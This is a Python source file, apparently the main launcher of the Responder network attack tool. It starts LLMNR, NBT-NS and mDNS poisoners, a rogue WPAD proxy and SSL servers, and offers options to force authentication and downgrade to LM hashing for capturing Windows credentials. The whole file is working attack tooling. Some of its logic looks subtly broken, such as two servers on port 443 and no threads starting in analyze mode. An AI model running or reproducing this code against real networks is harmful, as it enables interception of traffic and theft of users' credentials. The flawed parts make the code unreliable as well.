import optparse  # Module for command-line option parsing
import ssl  # Module for handling SSL/TLS encryption
from SocketServer import TCPServer, UDPServer, ThreadingMixIn  # Classes for creating socket-based servers - it is in python
from threading import Thread  # Module for handling threads

from utils import *  # Importing utility functions from the utils module


# Command-line options parsing
parser = optparse.OptionParser(
    usage='python %prog -I eth0 -w -r -f\nor:\npython %prog -I eth0 -wrf', 
    version=settings.__version__, 
    prog=sys.argv[0]
)
# Defining various command-line options
parser.add_option('-A', '--analyze', action="store_true", help="Analyze mode. No responses, just listen.", dest="Analyze", default=False)
parser.add_option('-I', '--interface', action="store", help="Network interface to use", dest="Interface", metavar="eth0", default=None)
parser.add_option('-i', '--ip', action="store", help="Local IP to use (for OSX)", dest="OURIP", metavar="10.0.0.21", default=None)
parser.add_option('-b', '--basic', action="store_true", help="Use Basic HTTP authentication. Default is NTLM.", dest="Basic", default=False)
parser.add_option('-r', '--wredir', action="store_true", help="Enable responses for netbios wredir suffix queries.", dest="Wredirect", default=False)
parser.add_option('-d', '--NBTNSdomain', action="store_true", help="Enable responses for netbios domain suffix queries.", dest="NBTNSDomain", default=False)
parser.add_option('-f', '--fingerprint', action="store_true", help="Fingerprint host issuing NBT-NS or LLMNR query.", dest="Finger", default=False)
parser.add_option('-w', '--wpad', action="store_true", help="Start WPAD rogue proxy server.", dest="WPAD_On_Off", default=False)
parser.add_option('-u', '--upstream-proxy', action="store", help="Upstream HTTP proxy for rogue WPAD Proxy.", dest="Upstream_Proxy", default=None)
parser.add_option('-F', '--ForceWpadAuth', action="store_true", help="Force authentication on wpad.dat file retrieval.", dest="Force_WPAD_Auth", default=False)
parser.add_option('--lm', action="store_true", help="Force LM hashing downgrade for old Windows systems.", dest="LM_On_Off", default=False)
parser.add_option('-v', '--verbose', action="store_true", help="Increase verbosity.", dest="Verbose")
options, args = parser.parse_args()  # Parsing command-line options

# Ensuring the script is run as root
if not os.geteuid() == 0:
    print color("[!] Responder must be run as root.")
    sys.exit(-1)
elif options.OURIP is None and IsOsX() is True:
    print "\nOSX detected, -i mandatory option is missing\n"
    parser.print_help()
    exit(-1)

# Initializing settings and loading configuration
settings.init()
settings.Config.populate(options)

# Display startup message
StartupMessage()

# Expand IP ranges based on the configuration
settings.Config.ExpandIPRanges()

# Check if in analyze mode, where no poisoning will occur
if settings.Config.AnalyzeMode:
    print color('[i] Responder is in analyze mode. No poisoning of requests.', 3, 1)

# Custom class to handle multi-threaded UDP server
class ThreadingUDPServer(ThreadingMixIn, UDPServer):
    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
            except:
                pass
        UDPServer.server_bind(self)

# Custom class to handle multi-threaded TCP server
class ThreadingTCPServer(ThreadingMixIn, TCPServer):
    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
            except:
                pass
        TCPServer.server_bind(self)

# Class for handling multicast DNS (mDNS) server with threading
class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
    def server_bind(self):
        MADDR = "224.0.0.251"  # Multicast address for mDNS
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reuse of address
        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)  # Set multicast TTL
        Join = self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MADDR) + settings.Config.IP_aton)
        if OsInterfaceIsSupported():
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
            except:
                pass
        UDPServer.server_bind(self)

# Class for handling LLMNR server with threading
class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
    def server_bind(self):
        MADDR = "224.0.0.252"  # Multicast address for LLMNR
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
        Join = self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MADDR) + settings.Config.IP_aton)
        if OsInterfaceIsSupported():
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
            except:
                pass
        UDPServer.server_bind(self)

# Allow reusing addresses on these server classes
ThreadingUDPServer.allow_reuse_address = 1
ThreadingTCPServer.allow_reuse_address = 1
ThreadingUDPMDNSServer.allow_reuse_address = 1
ThreadingUDPLLMNRServer.allow_reuse_address = 1

# Function to start UDP server for broadcast messages
def serve_thread_udp_broadcast(host, port, handler):
    try:
        server = ThreadingUDPServer(('', port), handler)  # Initialize the server
        server.serve_forever()  # Start server in an infinite loop
    except:
        print color("[!] Error starting UDP server on port " + str(port))

# Function to start NBT-NS poisoner (NetBIOS Name Service)
def serve_NBTNS_poisoner(host, port, handler):
    serve_thread_udp_broadcast(host, port, handler)

# Function to start mDNS poisoner
def serve_MDNS_poisoner(host, port, handler):
    try:
        server = ThreadingUDPMDNSServer((host, port), handler)
        server.serve_forever()
    except:
        print color("[!] Error starting UDP server on port " + str(port))

# Function to start LLMNR poisoner
def serve_LLMNR_poisoner(host, port, handler):
    try:
        server = ThreadingUDPLLMNRServer((host, port), handler)
        server.serve_forever()
    except:
        print color("[!] Error starting UDP server on port " + str(port))

# Function to start generic UDP server
def serve_thread_udp(host, port, handler):
    try:
        if OsInterfaceIsSupported():
            server = ThreadingUDPServer((settings.Config.Bind_To, port), handler)
        else:
            server = ThreadingUDPServer((host, port), handler)
        server.serve_forever()
    except:
        print color("[!] Error starting UDP server on port " + str(port))

# Function to start generic TCP server
def serve_thread_tcp(host, port, handler):
    try:
        if OsInterfaceIsSupported():
            server = ThreadingTCPServer((settings.Config.Bind_To, port), handler)
        else:
            server = ThreadingTCPServer((host, port), handler)
        server.serve_forever()
    except:
        print color("[!] Error starting TCP server on port " + str(port))

# Function to start an SSL-enabled TCP server
def serve_thread_SSL(host, port, handler):
    try:
        cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)  # Path to SSL certificate
        key = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)  # Path to SSL key

        if OsInterfaceIsSupported():
            server = ThreadingTCPServer((settings.Config.Bind_To, port), handler)
        else:
            server = ThreadingTCPServer((host, port), handler)

        # Wrap the socket with SSL
        server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
        server.serve_forever()
    except:
        print color("[!] Error starting SSL server on port " + str(port))

# Main function to initialize all servers and start threads
def main():
    try:
        threads = []  # List to hold thread objects

        # Loading poisoners for LLMNR, mDNS, and NBT-NS
        from poisoners.LLMNR import LLMNR
        from poisoners.NBTNS import NBTNS
        from poisoners.MDNS import MDNS
        threads.append(Thread(target=serve_NBTNS_poisoner, args=('', 137, NBTNS)))
        threads.append(Thread(target=serve_LLMNR_poisoner, args=('', 5355, LLMNR)))
        threads.append(Thread(target=serve_MDNS_poisoner, args=('', 5353, MDNS)))

        # Check for Analyze mode and act accordingly
        if not settings.Config.AnalyzeMode:
            if settings.Config.WPAD_On_Off is True:
                from servers.HTTP import Proxy, WPADServer
                threads.append(Thread(target=serve_thread_tcp, args=('', 80, WPADServer)))
                threads.append(Thread(target=serve_thread_tcp, args=('', 443, Proxy)))
                threads.append(Thread(target=serve_thread_SSL, args=('', 443, Proxy)))

            # Start the poisoners and servers in separate threads
            for thread in threads:
                thread.daemon = True  # Allow thread to exit cleanly
                thread.start()

            # Keep main thread alive indefinitely
            while True:
                time.sleep(1)

    except KeyboardInterrupt:
        print color("\nShutting down Responder...\n")

# Entry point for the script
if __name__ == "__main__":
    main()
